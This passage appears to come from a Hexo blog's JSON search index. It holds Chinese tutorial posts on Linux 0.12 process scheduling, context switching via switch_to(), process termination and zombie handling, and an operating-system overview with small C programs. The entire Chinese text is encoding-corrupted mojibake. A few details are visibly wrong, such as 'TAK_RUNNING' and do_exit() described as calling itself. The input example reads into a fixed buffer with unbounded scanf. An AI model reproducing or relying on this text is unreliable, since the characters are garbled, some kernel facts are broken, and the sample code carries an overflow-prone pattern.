è¿™é‡Œå°¤å…¶éœ€è¦æ³¨æ„ï¼šåˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹å’ŒåŠ è½½è¿è¡Œä¸€ä¸ªæ‰§è¡Œç¨‹åºæ–‡ä»¶æ˜¯ä¸¤ä¸ªä¸åŒçš„æ¦‚å¿µã€‚å½“åˆ›å»ºå­è¿›ç¨‹æ—¶ï¼Œå®ƒå®Œå…¨æ˜¯å¤åˆ¶äº†çˆ¶è¿›ç¨‹çš„ä»£ç æ®µå’Œæ•°æ®åŒºï¼Œå¹¶ä¼šåœ¨å…¶ä¸­æ‰§è¡Œå­è¿›ç¨‹éƒ¨åˆ†çš„ä»£ç ã€‚è€Œæ‰§è¡Œå­˜å‚¨è®¾å¤‡ä¸Šçš„ç¨‹åºæ—¶ï¼Œä¸€èˆ¬ä¼šåœ¨å­è¿›ç¨‹ä¸­è¿è¡Œ exec() ç³»ç»Ÿè°ƒç”¨æ¥è¿›è¡Œæ“ä½œã€‚åœ¨è¿›å…¥ exec() åï¼Œå­è¿›ç¨‹åŸæ¥çš„ä»£ç åŒºå’Œæ•°æ®åŒºéƒ½ä¼šè¢«æ¸…é™¤æ‰ï¼ˆé‡Šæ”¾æ‰ï¼‰ï¼Œç„¶åå°†è¯¥è¿›ç¨‹è¿è¡Œæ–°ç¨‹åºæ—¶ï¼Œç”±äºæ­¤æ—¶å†…æ ¸è¿˜æ²¡æœ‰ä»å­˜å‚¨è®¾å¤‡ä¸Šå°†è¯¥ç¨‹åºä»£ç åŠ è½½è¿‘æ¥ï¼Œæ‰€ä»¥ CPU ä¼šç«‹åˆ»äº§ç”Ÿä»£ç é¡µé¢ä¸å­˜åœ¨çš„å¼‚å¸¸ï¼ˆFaultï¼‰ï¼Œæ­¤æ—¶å†…å­˜ç®¡ç†ç¨‹åºå°±ä¼šä»å­˜å‚¨è®¾å¤‡ä¸Šæ‰¾åˆ°å¯¹åº”ç¨‹åºä»£ç åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œç„¶å CPU é‡æ–°æ‰§è¡Œå¼•èµ·å¼‚å¸¸çš„æŒ‡ä»¤ï¼Œæ­¤æ—¶æ–°ç¨‹åºçš„ä»£ç æ‰çœŸæ­£è¢«æ‰§è¡Œèµ·æ¥ã€‚ æ•´ä½“æµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 0x0a è¿›ç¨‹è°ƒåº¦ åœ¨ Linux å†…æ ¸ä¸­ï¼Œè¿›ç¨‹è°ƒåº¦ä¸»è¦æ˜¯ä¸ºäº†é€‰æ‹©ç³»ç»Ÿä¸­å³å°†è¦è¿è¡Œçš„è¿›ç¨‹ï¼Œé€šè¿‡è°ƒåº¦æ¥å›åˆ‡æ¢è¿›ç¨‹è¿è¡Œèƒ½å¤Ÿç»™äººæ„Ÿè§‰ä¸Šå¤šè¿›ç¨‹åŒæ­¥è¿è¡Œçš„æ•ˆæœã€‚è¿™ç§é€‰æ‹©è¿è¡Œæœºåˆ¶æ˜¯å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿçš„åŸºç¡€ï¼Œå¯ä»¥å°† Linux å†…æ ¸çš„è°ƒåº¦ç¨‹åºçœ‹ä½œåœ¨æ‰€æœ‰å¤„äºè¿è¡ŒçŠ¶æ€çš„è¿›ç¨‹ä¹‹é—´åˆ†é… CPU è¿è¡Œæ—¶é—´çš„ç®¡ç†ä»£ç ã€‚é€šè¿‡å‰é¢å¯¹ Linux ç³»ç»Ÿçš„æè¿°å¯ä»¥çŸ¥é“ Linux è¿›ç¨‹æ˜¯æŠ¢å å¼çš„ï¼Œä¸è¿‡è¢«æŠ¢å çš„è¿›ç¨‹ä»ç„¶å¤„äº TAK_RUNNING çŠ¶æ€ï¼Œåªä¸è¿‡æš‚æ—¶æ²¡æœ‰è¢« CPU è¿è¡Œã€‚è¿›ç¨‹çš„æŠ¢å å‘ç”Ÿåœ¨è¿›ç¨‹å¤„äºç”¨æˆ·æ€æ‰§è¡Œé˜¶æ®µï¼Œåœ¨å†…æ ¸æ€æ‰§è¡Œæ—¶æ˜¯ä¸èƒ½å¤Ÿè¢«æŠ¢å çš„ã€‚ ä¸ºäº†èƒ½å¤Ÿä½¿å¾—è¿›ç¨‹æœ‰æ•ˆåœ°ä½¿ç”¨ç³»ç»Ÿèµ„æºï¼Œåˆèƒ½ä½¿è¿›ç¨‹æœ‰è¾ƒå¿«çš„å“åº”æ—¶é—´ï¼Œå°±éœ€è¦å¯¹è¿›ç¨‹çš„åˆ‡æ¢è°ƒåº¦é‡‡ç”¨ä¸€å®šçš„è°ƒåº¦ç­–ç•¥ã€‚ è°ƒåº¦ç¨‹åº Linux å†…æ ¸ä¸­çš„ schedule() å‡½æ•°é¦–å…ˆæ‰«æè¿›ç¨‹æ•°ç»„ï¼Œé€šè¿‡æ¯”è¾ƒæ¯ä¸ªå°±ç»ªæ€ï¼ˆ TASK_RUNNING ï¼‰è¿›ç¨‹çš„è¿è¡Œæ—¶é—´é€’å‡æ»´ç­”è®¡æ•° counter çš„å€¼æ¥ç¡®å®šå½“å‰å“ªä¸ªè¿›ç¨‹è¿è¡Œçš„æ—¶é—´æœ€å°‘ï¼Œcounter çš„æ•°å€¼è¶Šå¤§è¡¨ç¤ºå‰©ä½™çš„è¿è¡Œæ—¶é—´è¶Šå¤§ï¼Œäºæ˜¯å°±é€‰ä¸­è¯¥è¿›ç¨‹å¹¶ä½¿ç”¨è¿›ç¨‹åˆ‡æ¢å®å‡½æ•°æ¥è¿›è¡Œåˆ‡æ¢åˆ°è¯¥è¿›ç¨‹åˆ° CPU è¿›è¡Œè¿è¡Œã€‚ å¦‚æœæ­¤æ—¶æ‰€æœ‰å¤„äº TASK_RUNNING çŠ¶æ€è¿›ç¨‹çš„æ—¶é—´ç‰‡éƒ½å·²ç»ç”¨å®Œï¼Œç³»ç»Ÿå°±ä¼šæ ¹æ®æ¯ä¸ªè¿›ç¨‹çš„ä¼˜å…ˆæƒå€¼ priority å¯¹ç³»ç»Ÿä¸­æ‰€æœ‰è¿›ç¨‹ï¼ˆåŒ…æ‹¬æ­£åœ¨ç¡çœ çš„è¿›ç¨‹ï¼‰é‡æ–°è®¡ç®—æ¯ä¸ªä»»åŠ¡éœ€è¦è¿è¡Œçš„æ—¶é—´ç‰‡å€¼ counter ï¼ŒLinux 0.12 ç‰ˆæœ¬å†…æ ¸ä¸­å¯¹æ—¶é—´ç‰‡å€¼çš„è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š 1counter = (counter / 2) + priority é€šè¿‡è¿™æ ·çš„æ–¹å¼ï¼Œæ­£åœ¨ç¡çœ çš„è¿›ç¨‹è¢«å”¤é†’æ—¶å°±ä¼šå…·æœ‰è¾ƒé«˜çš„æ—¶é—´ç‰‡å€¼ counter ï¼Œç„¶åé€šè¿‡ schedule() å‡½æ•°é‡æ–°æ‰«æè¿›ç¨‹æ•°ç»„ä¸­æ‰€æœ‰å¤„äº TASK_RUNNING çŠ¶æ€çš„è¿›ç¨‹ï¼Œå¹¶é‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œç›´åˆ°é€‰æ‹©å‡ºä¸‹ä¸€ä¸ªåˆ‡æ¢æ‰§è¡Œçš„è¿›ç¨‹ï¼Œæœ€åè°ƒç”¨ switch_to() å®æ¥æ‰§è¡Œå®é™…çš„åˆ‡æ¢è¿›ç¨‹æ“ä½œã€‚ å¦‚æœæ­¤æ—¶æ²¡æœ‰å…¶ä»–è¿›ç¨‹å¯ä»¥è¿è¡Œï¼Œåˆ™ç³»ç»Ÿä¼šé€‰æ‹© 0 å·è¿›ç¨‹è¿è¡Œï¼Œåœ¨ Linux 0.12 ç‰ˆæœ¬å†…æ ¸ä¸­ï¼Œè¿›ç¨‹ 0 ä¼šè°ƒç”¨ pause() å°†è‡ªå·±è®¾ç½®æˆå¯ä¸­æ–­çš„ç¡çœ çŠ¶æ€å¹¶å†æ¬¡è°ƒç”¨ schedule() ï¼Œä¸è¿‡åœ¨è°ƒåº¦è¿›ç¨‹è¿è¡Œæ—¶ï¼Œschedule() å¹¶ä¸åœ¨æ„è¿›ç¨‹ 0 å¤„äºä»€ä¹ˆçŠ¶æ€ï¼Œåªè¦ç³»ç»Ÿç©ºé—²å°±ä¼šè°ƒç”¨ 0 å·è¿›ç¨‹è¿è¡Œã€‚ å…·ä½“æµç¨‹å›¾ä¸‹å›¾æ‰€ç¤ºï¼š è¿›ç¨‹åˆ‡æ¢ æ¯å½“é€‰æ‹©å‡ºä¸€ä¸ªæ–°çš„å¯æ‰§è¡Œçš„è¿›ç¨‹æ—¶ï¼Œ schedule() å‡½æ•°å°±ä¼šè°ƒç”¨å®šä¹‰åœ¨ Linux å†…æ ¸æºä»£ç ä¸­çš„ include/asm/system.h ä¸­çš„ switch_to() å®æ‰§è¡Œå®é™…è¿›ç¨‹åˆ‡æ¢æ“ä½œã€‚è¯¥å®ä¼šæŠŠ CPU çš„å½“å‰è¿›ç¨‹çŠ¶æ€ï¼ˆä¸Šä¸‹æ–‡ï¼‰æ›¿æ¢æˆæ–°è¿›ç¨‹çš„çŠ¶æ€ã€‚åœ¨è¿›è¡Œåˆ‡æ¢ä¹‹å‰ï¼Œswitch_to() å®ä¼šå…ˆæ£€æŸ¥è¦åˆ‡æ¢åˆ°çš„è¿›ç¨‹æ˜¯å¦å°±æ˜¯å½“å‰è¿›ç¨‹ï¼Œå¦‚æœæ˜¯åˆ™è°ƒå‡ºæµç¨‹ï¼ˆä»€ä¹ˆä¹Ÿä¸åšï¼‰ï¼Œç›´æ¥é€€å‡ºï¼›å¦åˆ™ï¼Œå°±å…ˆå°†å†…æ ¸å…¨å±€å˜é‡ current è®¾ç½®æˆæ–°ä»»åŠ¡çš„æŒ‡é’ˆï¼Œç„¶åé•¿è·³è½¬åˆ°æ–°ä»»åŠ¡çš„ä»»åŠ¡çŠ¶æ€æ®µ TSS ç»„æˆçš„åœ°å€å¤„ï¼Œé€ æˆ CPU æ‰§è¡Œä»»åŠ¡åˆ‡æ¢æ“ä½œã€‚æ­¤æ—¶ï¼ŒCPU ä¼šæŠŠæ‰€æœ‰å¯„å­˜å™¨çš„çŠ¶æ€ä¿å­˜åˆ°å½“å‰ä»»åŠ¡å¯„å­˜å™¨ TR ä¸­ TSS æ®µé€‰æ‹©ç¬¦æ‰€æŒ‡å‘çš„å½“å‰è¿›ç¨‹ä»»åŠ¡æ•°æ®ç»“æ„çš„ tssç»“æ„ä¸­ï¼Œç„¶åæŠŠæ–°ä»»åŠ¡çŠ¶æ€æ®µé€‰æ‹©ç¬¦æ‰€æŒ‡å‘çš„æ–°ä»»åŠ¡æ•°æ®ç»“æ„ä¸­ tss ç»“æ„ä¸­çš„å¯„å­˜å™¨ä¿¡æ¯æ¢å¤åˆ° CPU ä¸­ï¼Œç³»ç»Ÿå°±æ­£å¼å¼€å§‹æ‰§è¡Œæ–°çš„è¿›ç¨‹ã€‚è¿™ä¸ªè¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€æè¿°ï¼š 0x0b ç»ˆæ­¢è¿›ç¨‹ å½“ä¸€ä¸ªè¿›ç¨‹ç»“æŸäº†è¿è¡Œæˆ–åœ¨åŠé€”ä¸­æ­¢äº†è¿è¡Œï¼Œé‚£ä¹ˆ Linux å†…æ ¸å°±éœ€è¦é‡Šæ”¾è¿™ä¸ªè¿›ç¨‹æ‰€å ç”¨çš„ç³»ç»Ÿèµ„æºï¼Œè¿™åŒ…æ‹¬è¿›ç¨‹è¿è¡Œæ—¶æ‰“å¼€çš„æ–‡ä»¶ã€ç”³è¯·çš„å†…å­˜ç­‰ã€‚ å½“ä¸€ä¸ªç”¨æˆ·ç¨‹åºè°ƒç”¨ exit() ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå°±ä¼šæ‰§è¡Œå†…æ ¸å‡½æ•° do_exit() ï¼Œè¿™ä¸ªå‡½æ•°é¦–å…ˆä¼šé‡Šæ”¾è¿›ç¨‹ä»£ç æ®µå’Œæ•°æ®æ®µå ç”¨çš„å†…å­˜é¡µé¢ï¼Œå…³é—­è¿›ç¨‹å½“å‰æ‰“å¼€ç€çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå¯¹è¿›ç¨‹ä½¿ç”¨çš„å½“å‰å·¥ç§ç›®å½•ã€æ ¹ç›®å½•å’Œè¿è¡Œç¨‹åºçš„ i èŠ‚ç‚¹è¿›è¡ŒåŒæ­¥æ“ä½œã€‚å¦‚æœè¿›ç¨‹è¿˜å­˜åœ¨æœ‰å­è¿›ç¨‹ï¼Œè¿™ä¼šè®© init è¿›ç¨‹ä½œä¸ºæ‰€æœ‰å­è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ã€‚å¦‚æœè¿›ç¨‹æ˜¯ä¸€ä¸ªä¼šè¯å¤´è¿›ç¨‹å¹¶ä¸”æœ‰æ§åˆ¶ç»ˆç«¯ï¼Œåˆ™é‡Šæ”¾æ§åˆ¶ç»ˆç«¯ï¼Œå¹¶å‘å±äºè¯¥ä¼šè¯çš„æ‰€æœ‰è¿›ç¨‹å‘é€æŒ‚æ–­ä¿¡å· SIGHUP ï¼Œè¿™é€šå¸¸ä¼šç»ˆæ­¢è¯¥ä¼šè¯ä¸­çš„æ‰€æœ‰è¿›ç¨‹ï¼Œç„¶åæŠŠè¿›ç¨‹çŠ¶æ€è®¾ç½®ä¸ºåƒµæ­»çŠ¶æ€ TASK_ZOMBIE ï¼Œå¹¶å‘å…¶åŸçˆ¶è¿›ç¨‹å‘é€ SIGCHLD ä¿¡å·ï¼Œé€šçŸ¥å…¶æŸä¸ªå­è¿›ç¨‹å·²ç»ç»ˆæ­¢ã€‚æœ€åè°ƒç”¨ do_exit() å‡½æ•°å»æ‰§è¡Œå…¶ä»–è¿›ç¨‹ï¼Œç”±æ­¤å¯è§åœ¨è¿›ç¨‹è¢«ç»ˆæ­¢æ—¶ï¼Œå®ƒçš„ä»»åŠ¡æ•°æ®ç»“æ„ä»ç„¶ä¿ç•™ç€ï¼Œå› ä¸ºå…¶çˆ¶è¿›ç¨‹è¿˜éœ€è¦ä½¿ç”¨å…¶ä¸­çš„ä¿¡æ¯ã€‚ åœ¨å­è¿›ç¨‹æ‰§è¡ŒæœŸé—´ï¼Œçˆ¶è¿›ç¨‹é€šå¸¸ä½¿ç”¨ wait() æˆ– waitpid() å‡½æ•°ç­‰å¾…å…¶æŸä¸ªå­è¿›ç¨‹ç»ˆæ­¢ã€‚å½“ç­‰å¾…çš„å­è¿›ç¨‹è¢«ç»ˆæ­¢å¹¶å¤„äºåƒµæ­»çŠ¶æ€æ—¶ï¼Œçˆ¶è¿›ç¨‹å°±ä¼šæŠŠå­è¿›ç¨‹è¿è¡Œæ‰€ä½¿ç”¨çš„æ—¶é—´ç´¯åŠ åˆ°è‡ªå·±çš„è¿›ç¨‹ä¸­ï¼Œæœ€ç»ˆé‡Šæ”¾å·²ç»ˆæ­¢å­è¿›ç¨‹ä»»åŠ¡æ•°æ®ç»“æ„æ‰€å ç”¨çš„å†…å­˜é¡µé¢ï¼Œå¹¶è®¾ç½®ç©ºå­è¿›ç¨‹åœ¨ä»»åŠ¡æ•°ç»„ä¸­å ç”¨çš„æŒ‡é’ˆé¡¹ã€‚","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","slug":"A-OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"ã€åŸç†å‰–æã€‘Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æâ€”â€”æ“ä½œç³»ç»Ÿæ¦‚è¿°","date":"2023-12-18T01:37:30.801Z","path":"A_OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ/ã€åŸç†å‰–æã€‘1-æ“ä½œç³»ç»Ÿæ¦‚è¿°/","text":"æ¦‚è¿°ï¼šæœ¬ç« çŸ¥è¯†ç‚¹ ä»€ä¹ˆæ˜¯æ“ä½œç³»ç»Ÿ æ“ä½œç³»ç»Ÿæœ‰å“ªäº›åŠŸèƒ½ æ“ä½œç³»ç»Ÿçš„å‘å±•å†å² æ“ä½œç³»ç»Ÿçš„åˆ†ç±» æ“ä½œç³»ç»Ÿçš„ç»“æ„ç»„æˆ Linux æ“ä½œç³»ç»Ÿä»‹ç» 0x01 ä»€ä¹ˆæ˜¯æ“ä½œç³»ç»Ÿ ä¼—æ‰€å‘¨çŸ¥ï¼Œè®¡ç®—æœºç³»ç»Ÿæ˜¯æœ‰è®¡ç®—æœºç¡¬ä»¶å’Œè®¡ç®—æœºè½¯ä»¶ç»„æˆçš„ï¼Œè€Œè®¡ç®—æœºç¡¬ä»¶ä¸»è¦æ˜¯æŒ‡å¤§å®¶æ‰€ç†ŸçŸ¥çš„ä¸­å¤®å¤„ç†å™¨ï¼ˆCPUï¼‰ã€ç¡¬ç›˜ã€å†…å­˜ã€ä¸»æ¿ã€æ˜¾å¡ç­‰ç­‰ï¼Œè€Œè®¡ç®—æœºè½¯ä»¶å…¶å®æ˜¯åˆ†å±‚æ¬¡çš„ï¼Œåœ¨è®¡ç®—æœºç¡¬ä»¶ä¸Šè¿è¡Œçš„è®¡ç®—æœºè½¯ä»¶æœ€åº•å±‚å…¶å®å°±æ˜¯æ“ä½œç³»ç»Ÿã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ˜¯è®¡ç®—æœºç³»ç»Ÿå±‚æ¬¡ç»“æ„å›¾ï¼š å¯ä»¥è¯´æ“ä½œç³»ç»Ÿå°±æ˜¯ç›´æ¥è¿è¡Œåœ¨è®¡ç®—æœºç¡¬ä»¶è£¸æœºä¸Šçš„ç¬¬ä¸€å±‚è½¯ä»¶ï¼Œæ˜¯æ“ä½œç³»ç»Ÿä¸ºä¸Šå±‚åº”ç”¨æä¾›äº†è®¡ç®—æœºç¡¬ä»¶çš„æ“ä½œæ¥å£å’ŒåŸºç¡€åŠŸèƒ½ï¼Œå¹¶å°†è®¡ç®—æœºç¡¬ä»¶å¤–è®¾çš„æ•°æ®ä¿¡å·ç­‰è·å–åˆ°çš„æ•°æ®ä¼ é€’ç»™ä¸Šå±‚åº”ç”¨ã€‚ æ“ä½œç³»ç»Ÿæœ‰å“ªäº›åŠŸèƒ½ çŸ¥é“äº†æ“ä½œç³»ç»Ÿåœ¨è®¡ç®—æœºç³»ç»Ÿä¸­æ‰€å¤„çš„ä½ç½®åï¼Œå°±åº”è¯¥æ˜ç™½æ“ä½œç³»ç»Ÿçš„ä¸»è¦ç›®çš„å°±æ˜¯ä¸ºäº†æ–¹ä¾¿ç”¨æˆ·ä½¿ç”¨è®¡ç®—æœºç³»ç»Ÿå’Œæé«˜è®¡ç®—æœºç³»ç»Ÿèµ„æºåˆ©ç”¨ç‡è€Œè¯ç”Ÿçš„è½¯ä»¶ç³»ç»Ÿã€‚ æ“ä½œç³»ç»Ÿçš„ä¸»è¦åŠŸèƒ½å¯ç”¨æ¦‚å†µä¸ºä»¥ä¸‹ä¸¤æ–¹é¢ï¼š æä¾›äººæœºæ¥å£ ç®¡ç†è®¡ç®—æœºèµ„æº äººæœºæ¥å£ æä¾›äººæœºæ¥å£å…¶å®å°±æ˜¯è¿è¡Œåœ¨è®¡ç®—æœºç¡¬ä»¶ä¸Šçš„æ“ä½œç³»ç»Ÿä¸ºç”¨æˆ·çš„ä½¿ç”¨æä¾›äº†æ–¹å¼å’Œæ–¹æ³•ã€‚æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯æˆ‘ä»¬å¼€å‘äººå‘˜åœ¨è®¡ç®—æœºä¸ŠåŸºäºæ“ä½œç³»ç»Ÿè¿›è¡Œè½¯ä»¶çš„å¼€å‘å’Œä½¿ç”¨ï¼Œä»è€Œå®ç°äº†ç¨‹åºçš„å¼€å‘è¿è¡Œã€‚ å¤§å®¶éƒ½çŸ¥é“ï¼Œåƒ C ã€C++ ä¸€ç±»çš„ç¼–è¯‘æ€§è¯­è¨€ç¼–å†™çš„ç¨‹åºåœ¨çœŸæ­£è¿è¡Œèµ·æ¥ä¹‹å‰æ˜¯éœ€è¦è¿›è¡Œä»£ç ç¼–è¯‘ã€é“¾æ¥åæ‰èƒ½è¿è¡Œçš„ã€‚å…¶ä¸­ï¼Œä»£ç ç¼–è¯‘æ˜¯å°†é«˜çº§è¯­è¨€ç¼–è¯‘æˆç®€å•çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œå¼•å…¥é“¾æ¥åå°±éœ€è¦ç”¨åˆ°æ“ä½œç³»ç»Ÿä¸‹çš„åº“çš„æ¦‚å¿µï¼ˆå°¤å…¶æ˜¯åŠ¨æ€åº“é“¾æ¥ï¼‰ï¼Œæœ€ååˆ°çœŸæ­£è¿è¡Œç¨‹åºæ—¶ï¼Œç¨‹åºå…¶å®æ˜¯åœ¨æ“ä½œç³»ç»Ÿçš„åŸºç¡€ä¸Šæ‰è¿è¡Œèµ·æ¥çš„ã€‚ ç°åœ¨ï¼Œæˆ‘ä»¬å¤§å®¶æ¥ç®€å•ç»ƒä¹ ä¸€ä¸ªæœ€åŸºæœ¬çš„ç¨‹åºå‘˜å…¥é—¨ç¨‹åº â€œhello world!â€ ã€‚å¤§å®¶åŸºäºç°åœ¨çš„ Ubuntu æ“ä½œç³»ç»Ÿç¯å¢ƒï¼Œåœ¨ç»ˆç«¯çª—å£ä¸‹ä½¿ç”¨ vim ç¼–è¾‘å™¨ç¼–å†™ä»£ç ï¼Œå…·ä½“å‘½ä»¤å¦‚ä¸‹ï¼š 1vim hello.c åœ¨æ‰“å¼€çš„ VI çª—å£ä¸­ï¼Œä½¿ç”¨ i åˆ‡æ¢åˆ°è¾“å…¥çŠ¶æ€ï¼Œç„¶åç¼–å†™å…¥å¦‚ä¸‹ä»£ç ï¼š 1234567#include &lt;stdio.h&gt;int main(int argc, char **argv)&#123; printf(&quot;hello world!\\n&quot;); return 0;&#125; åœ¨å¡«å†™å®Œä»£ç å†…å®¹åï¼ŒæŒ‰ä¸‹ Esc åˆ‡æ¢åˆ°æ­£å¸¸æ¨¡å¼ï¼Œè¾“å…¥ :wq ä¿å­˜å†…å®¹é€€å‡º Vi ç¼–è¾‘å™¨ï¼Œç„¶åé€šè¿‡ä»¥ä¸‹å‘½ä»¤å®Œæˆ C ä»£ç çš„ç¼–è¯‘ï¼š 1234# ä»…è¿›è¡Œç¼–è¯‘æ“ä½œï¼Œä¸è¿›è¡Œé“¾æ¥gcc -c hello.c -o hello.o# å®Œæˆé“¾æ¥æ“ä½œï¼Œäº§ç”Ÿå¯æ‰§è¡Œæ–‡ä»¶gcc hello.o -o hello æ­¤æ—¶ï¼Œäº§ç”Ÿçš„ hello å¯æ‰§è¡Œæ–‡ä»¶å°±æ˜¯åŸºäº Ubuntuï¼ˆLinuxï¼‰æ“ä½œç³»ç»Ÿçš„å¯ä»¥è¿è¡Œçš„ç¨‹åºï¼Œå¦‚æœç®€å•è„±ç¦»è¿™ä¸ªæ“ä½œç³»ç»Ÿï¼Œè¿™ä¸ªç¨‹åºæ˜¯æ— æ³•è¿è¡Œèµ·æ¥çš„ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ file å‘½ä»¤æ¥æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶çš„åŸºæœ¬å±æ€§ï¼š 1file hello ç»“æœå¦‚ä¸‹ï¼š é€šè¿‡è¿™æ ·ç®€å•çš„ä¸€ä¸ªç¨‹åºçš„ç¼–è¯‘ã€è¿è¡Œç»ƒä¹ ï¼Œå¤§å®¶åº”è¯¥æ˜ç™½æ“ä½œç³»ç»Ÿæ‰€æä¾›çš„äººæœºæ¥å£æ˜¯ä»€ä¹ˆäº†å§ï¼Ÿå…¶å®äººæœºæ¥å£ä¸»è¦å°±æ˜¯ä¸ºäº†ç»™äººä»¬æä¾›ä¸è®¡ç®—æœºè¿›è¡Œäº¤äº’çš„æ¥å£åŠŸèƒ½ã€‚ ç®¡ç†è®¡ç®—æœºèµ„æº è®¡ç®—æœºç³»ç»Ÿçš„èµ„æºæ€»çš„æ¥è¯´åˆ†ä¸ºç¡¬ä»¶èµ„æºå’Œè½¯ä»¶èµ„æºï¼Œç¡¬ä»¶èµ„æºæœ‰å¤„ç†å™¨ã€å­˜å‚¨å™¨ã€å¤–è®¾ç­‰ï¼›è½¯ä»¶èµ„æºåˆ™å¤§éƒ¨åˆ†æŒ‡ç¨‹åºå’Œæ•°æ®ã€‚ æ“ä½œç³»ç»Ÿæä¾›äº†å¤§é‡ç”¨äºç®¡ç†è¿™äº›èµ„æºçš„åŠŸèƒ½ã€‚å…·ä½“å¦‚ä¸‹ï¼š å¤„ç†å™¨èµ„æºç®¡ç†ï¼šå¤„ç†å™¨è°ƒåº¦ã€è¿›ç¨‹æ§åˆ¶ã€è¿›ç¨‹é€šä¿¡ã€è¿›ç¨‹åŒæ­¥ å­˜å‚¨ç®¡ç†ï¼šå†…å­˜åˆ†é…ã€åœ°å€è½¬æ¢ã€å†…å­˜ä¿æŠ¤ã€å†…å­˜æ‰©å…… è®¾å¤‡ç®¡ç†ï¼šè®¾å¤‡åˆ†é…ã€ç¼“å†²ç®¡ç†ã€è®¾å¤‡é©±åŠ¨ã€è®¾å¤‡æ— å…³æ€§ æ–‡ä»¶ç®¡ç†ï¼šæ–‡ä»¶å­˜å‚¨ç©ºé—´ç®¡ç†ã€ç›®å½•ç®¡ç†ã€æ–‡ä»¶æ“ä½œã€æ–‡ä»¶æƒé™æ§åˆ¶ ä¸‹é¢é€šè¿‡ä¸€ä¸ªç®€å•çš„è¾“å…¥ã€è¾“å‡ºç¨‹åºæ¥æ¼”ç¤ºæ“ä½œç³»ç»Ÿç®¡ç†è®¾å¤‡çš„åŠŸèƒ½ï¼Œæ„å»ºå®ç°ä¸€ä¸ª input çš„ç¨‹åºï¼Œåˆ›å»ºæºæ–‡ä»¶ï¼š 1vim input.c åœ¨æºæ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š 123456789101112131415#include &lt;stdio.h&gt;int main(int argc, char **argv)&#123; char msg[128] = &#123;0&#125;; int ret = 0; printf(&quot;Please Input message: \\n&quot;); scanf(&quot;%s&quot;, msg); printf(&quot;Your input message : \\n&quot;); printf(&quot;%s\\n&quot;, msg); return 0;&#125; æ·»åŠ å®Œæˆä»£ç åï¼Œä½¿ç”¨ç¼–è¯‘å™¨è¿›è¡Œç¼–è¯‘å’Œè¿è¡Œï¼š 12gcc input.c -o input./input æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š ä»è¿™ä¸ªç¨‹åºçš„è¿è¡Œè¿‡ç¨‹ä¸­èƒ½å¤Ÿçœ‹å‡ºï¼Œå½“ç¨‹åºæ‰§è¡Œå¼€å§‹ï¼Œå±å¹•ä¸Šä¼šæ˜¾ç¤ºæˆ‘ä»¬æƒ³è¦æ‰“å°çš„å­—ç¬¦ä¸²æ•°æ®ï¼Œè¿™é‡Œå°±ç”¨åˆ°äº†æ“ä½œç³»ç»Ÿçš„è¾“å‡ºè®¾å¤‡ç®¡ç†åŠŸèƒ½ï¼Œå°†æ•°æ®å‘é€ç»™æ˜¾å¡è¿›è¡Œæ˜¾ç¤ºï¼›ç„¶åæˆ‘ä»¬é€šè¿‡é”®ç›˜è¾“å…¥äº†æ¶ˆæ¯æ•°æ®ï¼Œæ“ä½œç³»ç»Ÿç®¡ç†çš„è¾“å…¥è®¾å¤‡ï¼ˆé”®ç›˜ï¼‰è·å–åˆ°æˆ‘ä»¬æ•²å‡»é”®ç›˜çš„äº‹ä»¶æ¶ˆæ¯åæ‹¼æˆäº†æœ€ç»ˆè¾“å…¥çš„æ¶ˆæ¯æ•°æ®é€ç»™è¿è¡Œçš„åº”ç”¨ç¨‹åºï¼Œç„¶ååº”ç”¨ç¨‹åºæœ€ç»ˆé‡æ–°å°†è·å–åˆ°çš„æ•°æ®æ‰“å°æ˜¾ç¤ºåˆ°äº†å±å¹•ä¸Šã€‚å…·ä½“æµç¨‹å‚è€ƒå¦‚ä¸‹ï¼š 0x03 æ“ä½œç³»ç»Ÿçš„åˆ†ç±» ä»ä¸€å¼€å§‹çš„è£¸æœºåˆ°å•ä»»åŠ¡å¤„ç†çš„å•ç‰‡æœºï¼Œæœ€åå‘å±•æˆä¸ºå¦‚ä»Šçš„å¤šä»»åŠ¡å¹¶å‘å¤„ç†çš„ç°ä»£è®¡ç®—æœºï¼Œè®¡ç®—æœºç³»ç»Ÿå‘å±•è¿…é€Ÿï¼Œè€Œåœ¨è®¡ç®—æœºç³»ç»Ÿä¸­ååˆ†é‡è¦çš„æ“ä½œç³»ç»Ÿä¹Ÿå‘å±•å½¢æˆäº†å¤šç§ç±»ä¸åŒçš„æ“ä½œç³»ç»Ÿã€‚ ç”±äºåº”å¯¹çš„åœºæ™¯ä¸åŒï¼Œæ“ä½œç³»ç»Ÿæ ¹æ®å¤„ç†å¤šä»»åŠ¡çš„ä¸åŒæ–¹å¼å¯ä»¥åˆ†ä¸ºï¼š 